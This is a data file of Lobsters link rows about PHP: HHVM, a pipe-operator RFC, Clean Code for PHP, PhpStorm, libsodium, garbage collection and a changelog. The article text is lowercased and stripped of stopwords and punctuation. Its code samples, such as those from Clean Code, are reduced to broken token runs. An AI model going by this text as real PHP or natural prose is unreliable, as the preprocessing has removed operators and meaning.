147,Lobsters,php,PHP programming,HHVM / HACK and PHP 7 Support,http://hhvm.com/blog/10859/php-7-support,hhvm hack php support,recently released many new exciting language feature anonymous class generator delegation nightly release upcoming stable release backwards compatible alternative open tag ini documentation let u know issue comment,following along next version php language version recently released u working hhvm offer congratulation contributor latest release really excited see release come door mean future php release implication hhvm well php contains many new exciting language feature anonymous class generator delegation hhvm project committed continuing support evolving php language proud announce current nightly release support major php feature upcoming stable release first release hhvm support major php feature small number change php backwards compatible want leave behind many user relying solid php support may good reason want upgrade immediately therefore hhvm continue simultaneously support php php foreseeable future way simultaneous support work feature pose compatibility issue always available example anonymous class require special configuration use work default similarly feature removed php alternative open tag continue work hhvm foreseeable future ini option enables php behavior backwardsincompatible change php behavior remain default still major compatibility break option want turn one one see ini documentation detail language feature php course start php onward develop keep adding new php feature hhvm continue parity language please give nightly build try let u know issue fix release major feature working pas php test suite certain edge case minor feature missing want make sure solid release possible new php support comment milliondollarserver exciting looking forward see nightly work najbolji hosting nice php amazing danny van kooten neat still happily running hhvm intention switch anytime soon hear supporting feature reassuring atau hhvm kmklabs blog josh watzman dari facebook ada mengeluarkan blog post bahawa release hhvm akan dimundurkan untuk memastikan semua fitur baru yang ada di orhaan well done excited elian question guy compatibility problem php version application running start working might issue file add joel marcey elian type compatibility problem referring hhvm php support currently optin breaking change might occur use new feature use without opting attempted compatible php possible running anything particular
148,Lobsters,php,PHP programming,php.internals: [RFC] Pre-draft for PipeOp v2,http://news.php.net/php.internals/100706,phpinternals rfc predraft pipeop,rfc predraft pipeop http docshhvmcomhackoperatorspipeoperator http githubcomphpphpsrccomparemaster sgolemon,rfc predraft pipeop planning update rfc wikiphpnet issue atm nt coming back basic coaxing start discussion informally rfc update later background made rfc time ago implement hacklang pipe operator http docshhvmcomhackoperatorspipeoperator provides fluent calling nonobject interface circulated mixed review many negative negativity feeling like centered use magic placeholder token discussion levi others suggested simpler approach like offer http githubcomphpphpsrccomparemaster sgolemon alternate possibility version remove token instead treat rh expression callable obeying rule callable typehint elsewhere language specifically free function string containing function name eg funcname object method array object methodname static method array classname methodname closure expression eg function x return object instance invoke method given pipe expression output lh expression feed single arg callable rh example x hello strtoupper function x return x world x hello world nongoal nt include support base function name eg hello strtoupper conflict constant using constant store function name tote legit consistent language syntax future scope short lambda x x partial function somefunc fixed fixed would help make functionality useful worth discussing subthread required implemented time sara
149,Lobsters,php,PHP programming,The Future of HHVM,http://hhvm.com/blog/2017/09/18/the-future-of-hhvm.html,future hhvm,officially announced four month last hhvm release commits support hhvm aim target hack future reinvest open source set clearer expectation communicate openly stay focused overextend intend runtime choice folk pure code upcoming change better compatibility short term making hhvm compatible current version major php tool building tool library designed specifically hack hack standard library typeassert hack codegen xhplib autoloader finishing hack array eliminating destructors eliminating reference hhvm general,several month ago php officially announced endoflife hhvm team happy direction php taken proud role played pushing language runtime today since php community finally saying goodbye decided well next lts release cut four month receive support one year thereafter also last hhvm release commits support aligns php timeline sunsetting end hhvm user note drop support every quirk immediately removal release compatibility feature like extzendcompat eventually deprecated deleted clear however represents substantive departure change number behavior backwardcompatible facebook meanwhile used hhvm year almost exclusively run hack hack already addressed many shortcoming also fix well others though hack solution always match charting new course away want via renewed focus hack consequently hhvm aim target hhvm team belief clear path toward making hack fantastic language web development untethered php origin user disservice positioning hhvm uncommon le welldocumented le compatible runtime want make hhvm hack much even experience team lot feature library performance opportunity pipeline want take rest post share community hack future laid realistic goal better supporting hack hhvm three toplevel objective follows reinvest open source clear engineer dedicated working directly community need hard requirement want provide even biggest external user requisite support begun building effort start seeing clear improvement direction outlined coming month set clearer expectation communicate openly want user clear understanding plan goal priority make best technical decision product aim bring hack user conversation upcoming feature language change much earlier process stay focused overextend trying support hack would lead undesirable compromise front plan decouple even php make hack great without account oldest darkest corner php design want freedom make hack even performant ultimately make best web application language available complement goal one explicit nongoal intend runtime choice folk pure code expect hack retain good deal overlap time many user may find success using runtimes interchangeably short term want newest version make use new behavior hhvm suitable platform upcoming change goal mean user practice ironically mean better compatibility short term although open source effort focus hack fact matter hack designed built top php ecosystem order build nontrivial application pure hack developer need either rely major php framework build scratch latter option might available mediumsized company sufficient resource currently impractical potential hack adopter want change begun working toward goal making hhvm compatible current version major php tool like composer phpunit expect work continue directed need hack community major user compatibility compatibility sake however cherrypick feature bugforbug compatibility based need targeting specific php version eventual goal hack ecosystem core framework whether built team others writing pure hack project easy writing pure php better performance developer experience also building tool library designed specifically hack hack standard library providing consistent typesafe standard library full support dict keyset vec type expect release stable hhvm typeassert safely convert untyped data eg database result json data fully typed data hack codegen providing typesafe alternative magic method call xhplib full support hack typechecker autoloader support autoloading class type alias function constant astbased library tool linting automatically editing code expecting release early version within next week supporting hack user currently still entail supporting php library targeting php software beyond library release aim align effort change hack language depart php framework dependency open opportunity make major performance design improvement hack language example team working finishing hack array developed explicitly specialized arraylike data structure vec dict keyset easier typecheck open new performance opportunity available experimentation runtime several month soon ready official release eliminating destructors deterministic object destruction reason nonscalar php value require precise reference counting requirement long continues sizable performance bottleneck optimized jitcompiled code using garbage collection instead could unlock measurable performance improvement behavior destructors could closely imitated combination tryfinally new language construct eliminating reference php reference unusual semantics function specifies binding parameter indication callsite moreover reffiness part function interface parent method overridden derived class different reference binding parameter confusing performancedegrading disciplined referencelike construct inout function parameter could useful efficient conceive develop plan team prioritize communicating potential change user consider vital prerequisite iterating hack language aggressively must good process place helping user juggle release prepare coming next team also tackle longstanding issue raised many largest user writing better complete documentation hhvm configuration communicating releasetorelease change clearly improving crossplatform build eye towards improving developer experience hack running hhvm question concern enthusiasm direction like share please reach u hhvm general group facebook ramp effort coming month best give ear make sure keep loop get rolling
150,Lobsters,php,PHP programming,"Robert C. Martin's book Clean Code, adapted for PHP",https://github.com/jupeter/clean-code-php,robert c martin book clean code adapted php,clean code php table content introduction variable comparison function object data structure class solid repeat dry translation introduction cleancodejavascript variable use meaningful pronounceable variable name bad good back top use vocabulary type variable bad good back top use searchable name part bad good use searchable name part bad good back top use explanatory variable bad bad good back top avoid nesting deeply return early part bad good back top avoid nesting deeply return early part bad good back top avoid mental mapping bad good back top nt add unneeded context bad good back top use default argument instead short circuiting conditionals good bad good type hinting back top comparison good good back top null coalescing operator introduced php bad good back top function function argument fewer ideally bad good back top function name say bad good back top function one level abstraction bad bad good back top nt use flag function parameter bad good back top avoid side effect bad good back top nt write global function bad good back top nt use singleton pattern antipattern global instance hide dependency code smell single responsibility principle control creation lifecycle coupled test rather difficult end situation test need ordered misko hevery root problem bad good dsn back top encapsulate conditionals bad good back top avoid negative conditionals bad good back top avoid conditionals bad good back top avoid typechecking part bad good back top avoid typechecking part type declaration bad good back top remove dead code bad good back top object data structure use object encapsulation openclosed bad good back top make object privateprotected member modification class dangerous user class modification class dangerous descendant class dangerous modify boundary single class jenga effect blog post fabien potencier bad good back top class prefer composition inheritance bad good back top avoid fluent interface fluent interface method chaining phpunit mock builder doctrine query builder encapsulation decorator mock blog post marco pivetta bad good back top prefer final class composition single responsibility pattern blog post marco pivetta ocramius bad good back top solid solid single responsibility principle srp bad good back top openclosed principle ocp bad good back top liskov substitution principle lsp bad good back top interface segregation principle isp bad good back top dependency inversion principle dip bad good back top repeat dry dry class bad good good back top translation chinese russian spanish portuguese thai french vietnamese korean turkish back top,clean code php table content introduction variable comparison function object data structure class solid repeat dry translation introduction software engineering principle robert c martin book clean code adapted php style guide guide producing readable reusable refactorable software php every principle herein strictly followed even fewer universally agreed upon guideline nothing one codified many year collective experience author clean code inspired cleancodejavascript although many developer still use php example article work php variable use meaningful pronounceable variable name bad ymdstr moment format ymd good currentdate moment format ymd back top use vocabulary type variable bad getuserinfo getuserdata getuserrecord getuserprofile good back top use searchable name part read code ever write important code write readable searchable naming variable end meaningful understanding program hurt reader make name searchable bad heck result serializer serialize data good json serializer serialize data jsonunescapedslashes jsonprettyprint jsonunescapedunicode use searchable name part bad class user heck public access heck user access going user access good class user public const accessread public const accesscreate public const accessupdate public const accessdelete user default read create update something public access self accessread self accesscreate self accessupdate user access user accessupdate edit deny access right create something user access user accesscreate back top use explanatory variable bad address one infinite loop cupertino cityzipcoderegex pregmatch cityzipcoderegex address match savecityzipcode match match bad better still heavily dependent regex address one infinite loop cupertino cityzipcoderegex pregmatch cityzipcoderegex address match city zipcode match savecityzipcode city zipcode good decrease dependence regex naming subpatterns address one infinite loop cupertino cityzipcoderegex city zipcode pregmatch cityzipcoderegex address match savecityzipcode match city match zipcode back top avoid nesting deeply return early part many ifelse statement make code hard follow explicit better implicit bad function isshopopen day bool day isstring day day strtolower day day friday return true elseif day saturday return true elseif day sunday return true else return false else return false else return false good function isshopopen string day bool empty day return false openingdays friday saturday sunday return inarray strtolower day openingdays true back top avoid nesting deeply return early part bad function fibonacci int n n n n return fibonacci n fibonacci n else return else return else return supported good function fibonacci int n int n n return n n throw new exception supported return fibonacci n fibonacci n back top avoid mental mapping force reader code translate variable mean explicit better implicit bad l austin new york san francisco count l li l dostuff dosomeotherstuff wait li dispatch li good location austin new york san francisco foreach location location dostuff dosomeotherstuff dispatch location back top nt add unneeded context classobject name tell something nt repeat variable name bad class car public carmake public carmodel public carcolor good class car public make public model public color back top use default argument instead short circuiting conditionals good good breweryname null function createmicrobrewery breweryname hipster brew co void bad opinion understandable previous version better control value variable function createmicrobrewery name null void breweryname name hipster brew co good use type hinting sure breweryname null function createmicrobrewery string breweryname hipster brew co void back top comparison good simple comparison convert string integer b b expression always pas comparison b return false fact true string different integer good identical comparison compare type value b b expression verified comparison b return true back top null coalescing operator null coalescing new operator introduced php null coalescing operator added syntactic sugar common case needing use ternary conjunction isset return first operand exists null otherwise return second operand bad isset get name name get name elseif isset post name name post name else name nobody good name get name post name nobody back top function function argument fewer ideally limiting amount function parameter incredibly important make testing function easier three lead combinatorial explosion test ton different case separate argument zero argument ideal case one two argument ok three avoided anything consolidated usually two argument function trying much case time higherlevel object suffice argument bad class questionnaire public function construct string firstname string lastname string patronymic string region string district string city string phone string email good class name private firstname private lastname private patronymic public function construct string firstname string lastname string patronymic firstname firstname lastname lastname patronymic patronymic getters class city private region private district private city public function construct string region string district string city region region district district city city getters class contact private phone private email public function construct string phone string email phone phone email email getters class questionnaire public function construct name name city city contact contact back top function name say bad class email public function handle void mail subject body message new email handle message writing file message handle good class email public function send void mail subject body message new email clear obvious message send back top function one level abstraction one level abstraction function usually much splitting function lead reusability easier testing bad function parsebetterphpalternative string code void regexes statement explode code token foreach regexes regex foreach statement statement ast foreach token token lex foreach ast node parse bad carried functionality parsebetterphpalternative function still complex testable function tokenize string code array regexes statement explode code token foreach regexes regex foreach statement statement token return token function lexer array token array ast foreach token token ast return ast function parsebetterphpalternative string code void token tokenize code ast lexer token foreach ast node parse good best solution move dependency parsebetterphpalternative function class tokenizer public function tokenize string code array regexes statement explode code token foreach regexes regex foreach statement statement token return token class lexer public function lexify array token array ast foreach token token ast return ast class betterphpalternative private tokenizer private lexer public function construct tokenizer tokenizer lexer lexer tokenizer tokenizer lexer lexer public function parse string code void token tokenizer tokenize code ast lexer lexify token foreach ast node parse back top nt use flag function parameter flag tell user function one thing function one thing split function following different code path based boolean bad function createfile string name bool temp false void temp touch temp name else touch name good function createfile string name void touch name function createtempfile string name void touch temp name back top avoid side effect function produce side effect anything take value return another value value side effect could writing file modifying global variable accidentally wiring money stranger need side effect program occasion like previous example might need write file want centralize nt several function class write particular file one service one one main point avoid common pitfall like sharing state object without structure using mutable data type written anything centralizing side effect occur happier vast majority programmer bad global variable referenced following function another function used name array could break name ryan mcdermott function splitintofirstandlastname void global name name explode name splitintofirstandlastname vardump name ryan mcdermott good function splitintofirstandlastname string name array return explode name name ryan mcdermott newname splitintofirstandlastname name vardump name ryan mcdermott vardump newname ryan mcdermott back top nt write global function polluting globals bad practice many language could clash another library user api would nonethewiser get exception production let think example wanted configuration array could write global function like config could clash another library tried thing bad function config array return foo bar good class configuration private configuration public function construct array configuration configuration configuration public function get string key string null coalescing operator return configuration key null load configuration create instance configuration class configuration new configuration foo bar must use instance configuration application back top nt use singleton pattern singleton antipattern paraphrased brian button generally used global instance bad hide dependency application code instead exposing interface making something global avoid passing around code smell violate single responsibility principle virtue fact control creation lifecycle inherently cause code tightly coupled make faking test rather difficult many case carry state around lifetime application another hit testing since end situation test need ordered big unit test unit test independent also good thought misko hevery root problem bad class dbconnection private static instance private function construct string dsn public static function getinstance dbconnection self instance null self instance new self return self instance singleton dbconnection getinstance good class dbconnection public function construct string dsn create instance dbconnection class configure dsn connection new dbconnection dsn must use instance dbconnection application back top encapsulate conditionals bad article state published good article ispublished back top avoid negative conditionals bad function isdomnodenotpresent domnode node bool isdomnodenotpresent node good function isdomnodepresent domnode node bool isdomnodepresent node back top avoid conditionals seems like impossible task upon first hearing people say supposed anything without statement answer use polymorphism achieve task many case second question usually well great would want answer previous clean code concept learned function one thing class function statement telling user function one thing remember one thing bad class airplane public function getcruisingaltitude int switch type case return getmaxaltitude getpassengercount case air force one return getmaxaltitude case cessna return getmaxaltitude getfuelexpenditure good interface airplane public function getcruisingaltitude int class implement airplane public function getcruisingaltitude int return getmaxaltitude getpassengercount class airforceone implement airplane public function getcruisingaltitude int return getmaxaltitude class cessna implement airplane public function getcruisingaltitude int return getmaxaltitude getfuelexpenditure back top avoid typechecking part php untyped mean function take type argument sometimes bitten freedom becomes tempting typechecking function many way avoid first thing consider consistent apis bad function traveltotexas vehicle void vehicle instanceof bicycle vehicle pedalto new location texas elseif vehicle instanceof car vehicle driveto new location texas good function traveltotexas vehicle vehicle void vehicle travelto new location texas back top avoid typechecking part working basic primitive value like string integer array use php ca nt use polymorphism still feel need typecheck consider type declaration strict mode provides static typing top standard php syntax problem manually typechecking require much extra verbiage faux typesafety get nt make lost readability keep php clean write good test good code review otherwise php strict type declaration strict mode bad function combine int isnumeric isnumeric throw new exception must type number return good function combine int int int return back top remove dead code dead code bad duplicate code reason keep codebase called get rid still safe version history still need bad function oldrequestmodule string url void function newrequestmodule string url void request newrequestmodule requesturl inventorytracker apple request wwwinventoryawesomeio good function requestmodule string url void request requestmodule requesturl inventorytracker apple request wwwinventoryawesomeio back top object data structure use object encapsulation php set public protected private keywords method using control property modification object want beyond getting object property nt look change every accessor codebase make adding validation simple set encapsulates internal representation easy add logging error handling getting setting inheriting class override default functionality lazy load object property let say getting server additionally part openclosed principle bad class bankaccount public balance bankaccount new bankaccount buy shoe bankaccount balance good class bankaccount private balance public function construct int balance balance balance public function withdraw int amount void amount balance throw new exception amount greater available balance balance amount public function deposit int amount void balance amount public function getbalance int return balance bankaccount new bankaccount buy shoe bankaccount withdraw shoesprice get balance balance bankaccount getbalance back top make object privateprotected member public method property dangerous change outside code may easily rely ca nt control code relies modification class dangerous user class protected modifier dangerous public available scope child class effectively mean difference public protected access mechanism encapsulation guarantee remains modification class dangerous descendant class private modifier guarantee code dangerous modify boundary single class safe modification wo nt jenga effect therefore use private default publicprotected need provide access external class information read blog post topic written fabien potencier bad class employee public name public function construct string name name name employee new employee john doe echo employee name employee name employee name john doe good class employee private name public function construct string name name name public function getname string return name employee new employee john doe echo employee name employee getname employee name john doe back top class prefer composition inheritance stated famously design pattern gang four prefer composition inheritance lot good reason use inheritance lot good reason use composition main point maxim mind instinctively go inheritance try think composition could model problem better case might wondering use inheritance depends problem hand decent list inheritance make sense composition inheritance represents isa relationship hasa relationship human animal v user userdetails reuse code base class human move like animal want make global change derived class changing base class change caloric expenditure animal move bad class employee private name private email public function construct string name string email name name email email bad employee tax data employeetaxdata type employee class employeetaxdata extends employee private ssn private salary public function construct string name string email string ssn string salary parent construct name email ssn ssn salary salary good class employeetaxdata private ssn private salary public function construct string ssn string salary ssn ssn salary salary class employee private name private email private taxdata public function construct string name string email name name email email public function settaxdata employeetaxdata taxdata taxdata taxdata back top avoid fluent interface fluent interface object oriented api aim improve readability source code using method chaining context frequently builder object pattern reduces verbosity code example phpunit mock builder doctrine query builder often come cost break encapsulation break decorator harder mock test suite make diffs commits harder read information read full blog post topic written marco pivetta bad class car private make honda private model accord private color white public function setmake string make self make make note returning chaining return public function setmodel string model self model model note returning chaining return public function setcolor string color self color color note returning chaining return public function dump void vardump make model color car new car setcolor pink setmake ford setmodel dump good class car private make honda private model accord private color white public function setmake string make void make make public function setmodel string model void model model public function setcolor string color void color color public function dump void vardump make model color car new car car setcolor pink car setmake ford car setmodel car dump back top prefer final class final used whenever possible prevents uncontrolled inheritance chain encourages composition encourages single responsibility pattern encourages developer use public method instead extending class get access protected one allows change code without break application use class condition class implement interface public method defined information read blog post topic written marco pivetta ocramius bad final class car private color public function construct color color color return string color vehicle public function getcolor return color good interface vehicle return string color vehicle public function getcolor final class car implement vehicle private color public function construct color color color inheritdoc public function getcolor return color back top solid solid mnemonic acronym introduced michael feather first five principle named robert martin meant five basic principle objectoriented programming design single responsibility principle srp stated clean code never one reason class change tempting jampack class lot functionality like take one suitcase flight issue class wo nt conceptually cohesive give many reason change minimizing amount time need change class important important much functionality one class modify piece difficult understand affect dependent module codebase bad class usersettings private user public function construct user user user user public function changesettings array setting void verifycredentials private function verifycredentials bool good class userauth private user public function construct user user user user public function verifycredentials bool class usersettings private user private auth public function construct user user user user auth new userauth user public function changesettings array setting void auth verifycredentials back top openclosed principle ocp stated bertrand meyer software entity class module function etc open extension closed modification mean though principle basically state allow user add new functionality without changing existing code bad abstract class adapter protected name public function getname string return name class ajaxadapter extends adapter public function construct parent construct name ajaxadapter class nodeadapter extends adapter public function construct parent construct name nodeadapter class httprequester private adapter public function construct adapter adapter adapter adapter public function fetch string url promise adaptername adapter getname adaptername ajaxadapter return makeajaxcall url elseif adaptername httpnodeadapter return makehttpcall url private function makeajaxcall string url promise request return promise private function makehttpcall string url promise request return promise good interface adapter public function request string url promise class ajaxadapter implement adapter public function request string url promise request return promise class nodeadapter implement adapter public function request string url promise request return promise class httprequester private adapter public function construct adapter adapter adapter adapter public function fetch string url promise return adapter request url back top liskov substitution principle lsp scary term simple concept formally defined subtype object type may replaced object type ie object type may substitute object type without altering desirable property program correctness task performed etc even scarier definition best explanation parent class child class base class child class used interchangeably without getting incorrect result might still confusing let take look classic squarerectangle example mathematically square rectangle model using isa relationship via inheritance quickly get trouble bad class rectangle protected width protected height public function setwidth int width void width width public function setheight int height void height height public function getarea int return width height class square extends rectangle public function setwidth int width void width height width public function setheight int height void width height height function printarea rectangle rectangle void rectangle setwidth rectangle setheight bad return square echo sprintf area getclass rectangle rectangle getarea phpeol rectangle new rectangle new square foreach rectangle rectangle printarea rectangle good best way separate quadrangle allocation general subtype shape despite apparent similarity square rectangle different square much common rhombus rectangle parallelogram subtype square rectangle rhombus parallelogram separate shape property albeit similar interface shape public function getarea int class rectangle implement shape private width private height public function construct int width int height width width height height public function getarea int return width height class square implement shape private length public function construct int length length length public function getarea int return length function printarea shape shape void echo sprintf area getclass shape shape getarea phpeol shape new rectangle new square foreach shape shape printarea shape back top interface segregation principle isp isp state client forced depend upon interface use good example look demonstrates principle class require large setting object requiring client set huge amount option beneficial time wo nt need setting making optional help prevent fat interface bad interface employee public function work void public function eat void class humanemployee implement employee public function work void working public function eat void eating lunch break class robotemployee implement employee public function work void working much public function eat void robot ca nt eat must implement method good every worker employee every employee worker interface workable public function work void interface feedable public function eat void interface employee extends feedable workable class humanemployee implement employee public function work void working public function eat void eating lunch break robot work class robotemployee implement workable public function work void working back top dependency inversion principle dip principle state two essential thing highlevel module depend lowlevel module depend abstraction abstraction depend upon detail detail depend abstraction hard understand first worked php framework like symfony seen implementation principle form dependency injection di identical concept dip keep highlevel module knowing detail lowlevel module setting accomplish di huge benefit reduces coupling module coupling bad development pattern make code hard refactor bad class employee public function work void working class robot extends employee public function work void working much class manager private employee public function construct employee employee employee employee public function manage void employee work good interface employee public function work void class human implement employee public function work void working class robot implement employee public function work void working much class manager private employee public function construct employee employee employee employee public function manage void employee work back top repeat dry try observe dry principle absolute best avoid duplicate code duplicate code bad mean one place alter something need change logic imagine run restaurant keep track inventory tomato onion garlic spice etc multiple list keep updated serve dish tomato one list one place update often duplicate code two slightly different thing share lot common difference force two separate function much thing removing duplicate code mean creating abstraction handle set different thing one functionmoduleclass getting abstraction right critical follow solid principle laid class section bad abstraction worse duplicate code careful said make good abstraction nt repeat otherwise find updating multiple place time want change one thing bad function showdeveloperlist array developer void foreach developer developer expectedsalary developer calculateexpectedsalary experience developer getexperience githublink developer getgithublink data expectedsalary experience githublink render data function showmanagerlist array manager void foreach manager manager expectedsalary manager calculateexpectedsalary experience manager getexperience githublink manager getgithublink data expectedsalary experience githublink render data good function showlist array employee void foreach employee employee expectedsalary employee calculateexpectedsalary experience employee getexperience githublink employee getgithublink data expectedsalary experience githublink render data good better use compact version code function showlist array employee void foreach employee employee render employee calculateexpectedsalary employee getexperience employee getgithublink back top translation also available language chinese russian spanish portuguese thai french vietnamese korean turkish back top
151,Lobsters,php,PHP programming,PhpStorm 2017.2.1,https://blog.jetbrains.com/phpstorm/2017/08/phpstorm-2017-2-1-is-here/,phpstorm,phpstorm jetbrains toolbox app information important change php side previous eap blog post important bug fix full list bugfixes improvement list release note download phpstorm build jetbrains toolbox app issue tracker,phpstorm build available download jetbrains toolbox app installed previous phpstorm phpstorm eap build soon get notification ide patch update build delivers new feature bug fix improvement php web take latest improvement intellij platform find information previous eap blog post list notable improvement important change php side support php blade support guest endguest inspection short open tag usage navigation appropriate loop breakcontinue see information previous eap blog post important bug fix php comment spellchecker recognize word apostrophe broken code completion javascript allow o resolve composer executable global installation printing mechanism print theme background color tab limited set auto importing flow type add type import see full list bugfixes improvement list issue tracker complete release note download phpstorm build platform click update jetbrains toolbox app please report bug feature request issue tracker jetbrains phpstorm team drive develop
152,Lobsters,php,PHP programming,Getting started with PHP: Essential dev tools,http://www.virtuouscode.com/2017/05/08/getting-started-with-php-essential-dev-tools/,getting started php essential dev tool,xampp chocolatey,first need php runtime get part allinone package including web server databasek kitchen sink xampp need start fiddling around code example using chocolatey install php simple choco install php commandline php executable php v php cli built apr nt visual c copyright c php group zend engine copyright c zend technology
153,Lobsters,php,PHP programming,Gnod - The Global Network Of Discovery,http://www.gnod.com,gnod global network discovery,,global network discovery let use latest technological advance make u discover better thing
154,Lobsters,php,PHP programming,"It Turns Out, 2017 is the Year of Simply Secure PHP Cryptography",https://paragonie.com/blog/2017/07/it-turns-out-2017-is-year-simply-secure-php-cryptography,turn year simply secure php cryptography,let make year simply secure php cryptography php getting extsodium unanimously noise vulnerable sidechannels absence special hardware authenticated encryption libsodium quick reference guide bsides orlando solving weird problem securely sodiumcompat modern cryptography legacy environment paragoniesodiumcompat supporting operating system cryptographically secure php development future release joomla website internet go sapient api en chronicle offer secure code delivery crypto privacy village defcon secure automatic update help make internet secure every website clean old tutorial forum post blog bad advice stack exchange share blog post developer quick answer page application security reading list github contribute open source software hire security expert hiring paragon initiative enterprise,six month ago wrote blog post titled let make year simply secure php cryptography time seemed ambitious possibly erring side idealism goal follows get sodium extension php core version write purephp polyfill support way back php happy report halfway effort successful php getting extsodium php internals team reputation somewhat changeadverse many breaking change without good reason change language weird way likely make everyone unhappy imagine surprise libsodium rfc proposed passed unanimously course total fairness similar level consensus among security cryptography expert recommending libsodium ask cryptographer pull request merged yesterday thereby cementing sodium status core extension next version php programming language mean several huge practical win developer simple secure public key cryptography baked using diffiehellman digital signature interoperability protocol use nacl libsodium eg noise ability wipe memory buffer first time since php inception encryption algorithm vulnerable sidechannels absence special hardware pdf authenticated encryption almost exclusively wrote libsodium quick reference guide last month demonstrate new php extension used solve common problem gave talk bsides orlando solving weird problem securely php scheduled released november sodiumcompat modern cryptography legacy environment part equation build purephp implementation cryptography offer tagged first version release paragoniesodiumcompat last month currently focusing making sure forward compatible php supporting operating system missed beta testing world moved onto hardware previously covered design decision made sodiumcompat post titled cryptographically secure php development hope serf starting point anyone implementing cryptography algorithm php sodiumcompat coming future release joomla cm power website internet go still half year left ambition year already realized nt rest laurel however already begun even ambitious project make internet secure designed sapient secure api engineering toolkit us sodium cryptography library authenticate andor encrypt http message body used sapient build chronicle selfhostable microservice obviates need company invest blockchain technology proposed start plan make composer package manager used php community use chronicle libsodium offer secure code delivery streaming software release metadata dedicated chronicle instance still work cut u giving talk crypto privacy village defcon secure automatic update cover lot challenge anticipate plan engineer solution easy use analyze hard attack help make internet secure whether security expert like php power every website making php ecosystem even little secure make internet whole far resilient attack clean old tutorial forum post blog one hardest challenge solve php ecosystem high ratio insecure secure tutorial example code internet highest ranking search result domainspecific problem make application vulnerable trivial owasp top attack follow example additionally difficult unlearn bad habit committed muscle memory instance bad security advice rank highly search engine potentially harmful bad advice stack exchange website correct providing dissenting answer adding security warning highranking andor accepted answer however internet nt live stack exchange blog forum post rank highly contains bad security advice take opportunity write uptodate article link instead also might good idea remove hyperlink website like peddle bad advice year ignoring feedback security expert clean php ecosystem going need enlist help php community share blog post developer cover lot securityrelated topic ranging trivial stuff like sql injection crosssite scripting advanced topic like adaptive chosenciphertext attack nt serve advertisement website ever intend blog post also released creative common license publish information want people learn whether reader revenue remains unchanged need place start quick answer page probably best place read everything published want learn topic nt covered application security reading list github contribute open source software chance php developer might consider security expert regular blog reader may pleasantly surprised next time read open source library looking sort vulnerability discussed length open source software nearubiquitous lot considered critical infrastructure example hardpressed find programming language nt use openssl way whether contribute time money moving needle towards future securebydefault difficult crook thrive hire security expert nt wait hit ransomware customer credit card stolen reach security company individual consultant help come cybersecurity milligram prevention worth several ton cure nt know company consultant could help company stay secure may want consider hiring paragon initiative enterprise disclaimer u
155,Lobsters,php,PHP programming,Babel-preset-php: PHP7 to ES7 syntax translator,https://gitlab.com/kornelski/babel-preset-php,babelpresetphp syntax translator,,babel preset converting php syntax javascript run subset php browser nodejs expanding atwood law read
156,Lobsters,php,PHP programming,How to optimize the PHP garbage collector usage to improve memory and performance,https://tideways.io/profiler/blog/how-to-optimize-the-php-garbage-collector-usage-to-improve-memory-and-performance,optimize php garbage collector usage improve memory performance,selectively disabling collector improved performance recompile obscure debug flag garbage php cleanup memory garbagestats php extension small php extension garbagestats garbage collection hook iceberg ahead sign day trial,behaviour php garbage collection gc small mystery might wonder work optimize usage application script running memory looking way reduce php gc way reduce memory script however arbitrarily littering code gcenable gcdisable gccollectcycles call everywhere automatically help obviously reduces expressiveness code know garbage collector slowing request speeding get triggered automatically much memory run clean maybe fear application suffering similar inefficient garbage collection usage composer three year ago selectively disabling collector improved performance sadly answer question available php engine unless want recompile obscure debug flag yeah thank show tool access necessary information first understand available optimization potential tradeoff phps gc sometimes need enable garbage collector sometimes better disable following summary bare bone get understand php memory please see anthony ferrara post garbage want dive deep topic php cleanup memory variable fall scope used place currently executed code anymore garbage collected automatically force early using unset end variable scope early variable part cyclic reference point b b back variable cleaned phps cycle garbage collector triggered whenever possible cyclic object array currently memory one fall scope collector enabled default every request toggled function gcenable gcdisable call function gccollectcycles collection cyclic reference triggered explicitly even nt memory yet optimal performance strategy enable garbage collector gc clean many possible high efficiency many cleanup potential cyclic reference disable find still used low efficiency cleanup find need enable disable garbage collection mentioned php actually provide statistic cleanup mechanism garbagestats php extension small php extension garbagestats come rescue based garbage collection hook coproposed adam harvey php code extracted tideway extension enhanced simple cli mode print statistic without requiring change code let run garbagestats version composer disable garbage collection simulate previous bottleneck php bincomposer update found garbage collection run current script collected efficency duration reduction function m loadproviderlistings m loadproviderlistings m parseconstraints m arrayloader load m pool computewhatprovides m arrayloader parselinks m equal m m rulewatchnode construct m solver solve m makeassertionruledecisions m solver runsat m transaction findupdates m installer doinstall m installer doinstall ieks table show selection garbage collection run except two collect cyclic reference running nt reduce memory still running iceberg ahead usecase calling gcdisable whole execution long running script contrast simple test script efficiently clean cyclic reference output found garbage collection run current script collected efficency duration reduction function m gccollectcycles m foo m foo m foo m test foo m test foo m test foo long running script fall fully efficient inefficient section solution simple requires thorough work garbagestats extension find section code triggering garbage collection inefficiently web request use function gcstats get information individual garbage collection run call gcdisable non gcefficient code section executed call gcenable non gcefficient code section finished gccollectcycles clean happy efficient garbage collection p tideway collecting garbage collection detail across application production want find garbage collection affect user performance sign day trial
157,Lobsters,php,PHP programming,PHP 7.1.7 release (5 CVEs),http://php.net/ChangeLog-7.php,php release cf,php changelog version version version version version version version version version version deprecate curly brace syntax accessing array element string offset deprecation php preloading rfc password hashing registry implementation version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version version,php changelog version aug apache fixed bug upgrade phpapachesapigetrequesttime return usec com fixed bug bstr php string conversion binary safe fixed bug dcom work username password parameter core fixed bug serialize unserialize method called statically fixed bug segfault phpstrreplacecommon fixed bug assertion failure dumping closure unresolved static variable fixed bug assertion failure assigning property string offset reference fixed bug ht iterators removed empty array destroyed fixed bug changing array undef index rw error segfaults fixed bug use free changing array undef var array write fetch fixed bug use free string used undefined index warning changed fixed bug public nonstatic property child take priority private static fixed bug getimagesize function silently truncates null byte cmb fileinfo fixed bug finfofile crash fileinfomime ftp fixed bug ftpsize large file mbstring fixed bug mbstrimwidth trim string phar fixed bug use freed hash key pharparsezipfile function reflection fixed bug getstaticproperties ignores property modification fixed bug getstaticpropertyvalue throw protected prop fixed bug use free type duplicated reflectionproperty get resolved standard fixed bug ca nt copy large data openbasedir fixed bug dnscheckrecord always return true alpine fixed bug arraywalk respect property type version jul core fixed bug zendinitfpu alters fpu precision fixed bug phpwinexe cpu lockup fixed bug getdefinedfunctions true may miss function fixed bug fake reflection scope affect tostring fixed possibly unsupported timercmp usage exif fixed bug sony picture php warning make model makernotes fileinfo fixed bug mimecontenttypefinfo returning incorrect mimetype filter 